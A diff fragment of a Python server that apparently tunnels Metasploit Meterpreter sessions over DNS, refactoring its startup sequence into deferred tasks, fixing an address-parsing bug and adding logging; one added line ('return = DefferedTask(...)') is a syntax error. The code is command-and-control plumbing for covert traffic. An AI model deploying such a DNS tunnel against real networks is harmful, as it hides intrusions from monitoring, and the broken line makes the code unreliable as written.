-            MSFClient.LOGGER.error("Client for server id %s is not found.Dropping data", self.msf_id)
-
-    def _setup_client(self):
-        """
-        Check if client is exists for this server and setup server-client links
-        :return: True if client is found and False otherwise
-        """
-        if not self.msf_id:
-            MSFClient.LOGGER.error("There are no msf id!!!")
-            return False
-        client = Registrator.instance().get_new_client_for_server(self.msf_id)
-        if client:
-            self.client = client
-            client.set_server(self)
-            MSFClient.LOGGER.info("Association client-server is done successfully(%s(%s)<->%s)",
-                                   self.msf_id, str(self), self.client.get_id())
-            return True
-        return False
-
-    def read_new_data(self):
-        with self.lock:
-            if self.wait_client:
-                MSFClient.LOGGER.error("Data is received in waiting client state.Can't not be here!!!!")
-                return
-            if self.parted_reader:
-                self.parted_reader.read()
-
-    def want_write(self):
-        if self.client:
-            return self.client.server_has_data()
-        return False
-
+            self._logger.info("Stage has already was requested on this server")
+    
     def polling(self):
-        self.server.poll()
+        self.connection._notify()
 
-    def write_data(self):
-        if self.client:
-            data = self.client.server_get_data()
-            if data:
-                MSFClient.LOGGER.info("Send data to server - %d bytes", len(data))
-                self.sock.send(data)
+    def _new_data(self, queue):
+        with ignored(Queue.Empty):
+            data = queue.get_nowait()
+            task = SendTask(data)
+            task.run(self.connection)
 
-    def close(self):
-        self.sock.close()
-        self.sock = None
+    def get_new_data_task(self, queue):
+        return = DefferedTask(self._new_data, queue)
 
-    def on_client_timeout(self):
-        MSFClient.LOGGER.info("Closing connection.(client timeout)")
-        self.client = None
-        self.server.remove_me(self)
-        self.close()
-        self.polling()
+
+class MSFConnectionFactory(RConnectionFactory):
+    def __init__(self):
+        super(MSFConnectionFactory, self).__init__()
+        self.clients = []
+
+    def create_connection(self, sock, address, reactor):
+        self._logger.info("New incoming connection from address %s", address)
+        connection = super(MSFConnectionFactory, self).create_connection(sock, address, reactor)
+        client = LSClient(connection, registrator=Registrator.instance())
+        self.clients.append(client)
+        return connection
 
 
 class TCPRequestHandler(BaseRequestHandlerDNS):
@@ -1936,12 +1890,12 @@ class ServerBuilder(object):
     def _parse_addr_port(self, param):
         addr = None
         port = param
-        if param.find(':'):
+        if param.find(':') != -1:
             addr, port = param.split(':')
         return (addr, int(port))
 
-    def _append_to_seq(self, start_func=None, end_func=None):
-        self.setup_seq.append((start_func, end_func))
+    def _append_to_seq(self, start_task=None, end_task=None):
+        self.setup_seq.append((start_task, end_task))
 
     def setup_cmd_args(self, args):
         reactor = FDReactor()
@@ -1950,45 +1904,60 @@ class ServerBuilder(object):
             logger.error("should indicated one ip address for DNS(ip value in --dnsaddr or in --ipaddr parameter")
             return False
         
-        self.setup_seq.append((lambda: DnsServer.create(args.domain, dns_addr if dns_addr else args.ipaddr),))
+        start_dns_task = DefferedTask(DnsServer.create, args.domain, dns_addr if dns_addr else args.ipaddr)
+        self._append_to_seq(start_dns_task)
 
         msf_addr, msf_port = self._parse_addr_port(args.laddr)
-        listener = MSFListener(msf_addr if msf_addr else '0.0.0.0', msf_port)
-        self.setup_seq.append((lambda: listener.start_loop(),))
+        listener_factory = RListenerFactory(connection_factory=MSFConnectionFactory())
+        listener_task = DefferedTask(reactor.create_listener, msf_addr if msf_addr else '0.0.0.0', msf_port, listener_factory=listener_factory)
+        self._append_to_seq(listener_task)
 
-        servers = [SocketServer.UDPServer(('', args.dport), UDPRequestHandler),
-                   SocketServer.TCPServer(('', args.dport), TCPRequestHandler)]
+        servers = [SocketServer.UDPServer(('', dns_port), UDPRequestHandler),
+                   SocketServer.TCPServer(('', dns_port), TCPRequestHandler)]
 
-        for s in servers:
+        def _start_server(s):
             thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
             thread.daemon = True  # exit the server thread when the main thread terminates
             thread.start()
             logger.info("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))
+
+
+        for s in servers:
+            server_task = DefferedTask(_start_server, s)
+            server_task_stop = DefferedTask(s.shutdown)
+            self._append_to_seq(server_task, server_task_stop)
         
-        self._append_to_seq(lambda: reactor.start_loop(), lambda: reactor.shutdown())
-        self._append_to_seq(lambda: reactor.wait_finish())
+        registrator = Registrator.instance()
+        registrator_stop = DefferedTask(registrator.shutdown)
+        self._append_to_seq(None, registrator_stop)
+
+        start_reactor = DefferedTask(reactor.start_loop)
+        stop_reactor = DefferedTask(reactor.shutdown)
+        self._append_to_seq(start_reactor, stop_reactor)
+        wait_end_reactor = DefferedTask(reactor.wait_finish)
+        self._append_to_seq(wait_end_reactor)
 
     def setup_from_config(self, config_filename):
         raise NotImplementedError()
 
     def build(self):
         def start_server():
-            for start_func, _ in self.setup_seq:
-                if start_func:
-                    start_func()
+            for start_task, _ in self.setup_seq:
+                if start_task:
+                    start_task.run()
         
         def stop_server():
-            for _, stop_func in self.setup_seq:
-                if stop_func:
-                    stop_func()
+            for _, stop_task in self.setup_seq:
+                if stop_task:
+                    stop_task.run()
 
         return start_server, stop_server
 
 
 def main():
     parser = argparse.ArgumentParser(description='Magic')
-    parser.add_argument('--dnsaddr', default=53, type=str, help='The DNS [addr:]port to listen on.')
-    parser.add_argument('--laddr', default=4444, type=str, help='The Meterpreter [addr:]port to listen on.')
+    parser.add_argument('--dnsaddr', default="53", type=str, help='The DNS [addr:]port to listen on.')
+    parser.add_argument('--laddr', default="4444", type=str, help='The Meterpreter [addr:]port to listen on.')
     parser.add_argument('--domain', '-D', action='append', type=str, required=True, help='The domain name.')
     parser.add_argument('--ipaddr', type=str, required=True, help='DNS IP')
     parser.add_argument('--config', type=str, help='Configuration file')
@@ -1996,17 +1965,21 @@ def main():
     
     builder = ServerBuilder()
     if args.config:
-        builder.setup_from_config(args.config_filename)
+        builder.setup_from_config(args.config)
     else:
         builder.setup_cmd_args(args)
 
+    logger.info("Build server")
     start_server, stop_server = builder.build()
     try:
+        logger.info("Starting server...")
         start_server()
     except:
-        pass
+        logger.exception("Exception during work")
     finally:
+        logger.info("Stopping server...")
         stop_server()
+        logger.info("Stopped")
 
 if __name__ == '__main__':
     main()
